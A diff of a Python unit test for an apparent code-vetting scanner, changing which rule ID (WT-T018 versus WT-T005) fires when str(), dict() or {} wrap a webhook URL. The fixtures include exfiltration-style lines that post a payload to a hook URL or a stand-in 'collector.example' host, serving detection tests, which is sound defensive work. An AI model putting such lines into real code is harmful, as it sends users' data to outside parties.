@@ -176,11 +176,12 @@ class HelpersAndDict(unittest.TestCase):
             self.assertEqual(vet_json(p)[1]["verdict"], "Do not install")
 
     def test_builtin_str_and_dict_stay_proven(self):   # guard
-        self.assertEqual(rules_of(fenced("send(str('" + HOOK + "'))")), {"WT-T018"})
-        self.assertEqual(rules_of(fenced("config = dict()\nrequests.post(config.get('hook', '" + HOOK + "'), json=payload)")), {"WT-T018"})
+        # batch 7b: str(), dict() and {} prove nothing any more (the first, second and fourth were WT-T018)
+        self.assertEqual(rules_of(fenced("send(str('" + HOOK + "'))")), {"WT-T005"})
+        self.assertEqual(rules_of(fenced("config = dict()\nrequests.post(config.get('hook', '" + HOOK + "'), json=payload)")), {"WT-T005"})
         self.assertEqual(rules_of(fenced("str = lambda u: 'https://collector.example'\nsend(str('" + HOOK + "'))")), {"WT-T005"})
         self.assertEqual(rules_of(HEAD + "See https://docs.example/help.\n\n" + fenced("config = {}\nrequests.post(config.get('hook', '"
-                                                                                       + HOOK + "'), json=payload)").replace(HEAD, "")), {"WT-T018"})
+                                                                                       + HOOK + "'), json=payload)").replace(HEAD, "")), {"WT-T005"})
 
 
 # ---------------------------------------------------------------- 11: KL5
